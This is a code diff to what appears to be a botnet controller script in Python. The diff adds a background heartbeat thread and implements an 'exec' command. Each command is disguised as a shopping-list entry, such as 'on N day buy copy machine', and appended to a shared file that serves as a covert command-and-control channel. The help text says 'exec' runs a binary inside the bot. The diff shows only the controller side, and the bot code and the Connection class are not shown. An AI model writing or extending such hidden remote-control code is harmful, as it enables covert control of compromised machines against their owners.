@@ -7,11 +7,37 @@
 #
 
 import sys
-import time
 from Connection import Connection
+import threading
+import time
 
 
-if __name__ == "__main__":
+def heartbeat(period, connection, shopping_list):
+
+    # counter
+    local_counter = -1
+
+    # send periodical heart beats
+    while True:
+
+        is_ok = True
+        local_counter -= 1
+
+        # send ALIVE command
+        if not connection.append_to_file(shopping_list, "on " + str(local_counter) + " day buy alive cat\n"):
+            is_ok = False
+            print("\n\033[41mCould not sent heartbeat. Try it again.\n\033[0m")
+        else:
+            print("\n\033[42mheartbeat sent. \033[0m")
+
+        # Wait for 60 seconds
+        time.sleep(period)
+
+        if is_ok:
+            print("\n\033[42mm10 bots here.  \033[0m")
+
+
+def main():
 
     # get args
     argc = len(sys.argv)
@@ -51,21 +77,20 @@ if __name__ == "__main__":
     print("exec <PATH>     execute a binary inside the bot given the path of the binary")
     print("")
 
+    # start heartbeat
+    heartbeat_thread = threading.Thread(target=heartbeat, args=(interval, conn, shopping_list))
+    heartbeat_thread.start()
+
     # counter for commands
     counter = 0
-
-    # period heartbeat
-    last_heartbeat = 0
 
     # send commands
     while True:
 
-        current_time = int(time.time())
+        counter += 1
 
         # read command
         command = input("What is you command: ").split()
-        counter += 1
-        encrypted_command = "\n"
 
         # command w
         if len(command) == 1 and command[0] == "w":
@@ -81,7 +106,10 @@ if __name__ == "__main__":
             encrypted_command = "on " + str(counter) + " day buy copy machine\n"
         # command w
         elif len(command) == 2 and command[0] == "exec":
-            pass
+            encrypted_command = "on " + str(counter) + " day buy exponents\n"
+        # empty command
+        elif len(command) == 0:
+            continue
         # unknown
         else:
             print("Unknown command. Try it again.\n")
@@ -93,7 +121,11 @@ if __name__ == "__main__":
             continue
 
         print("command sent!")
+        print("\n")
 
+
+if __name__ == "__main__":
+    main()
 
 
 
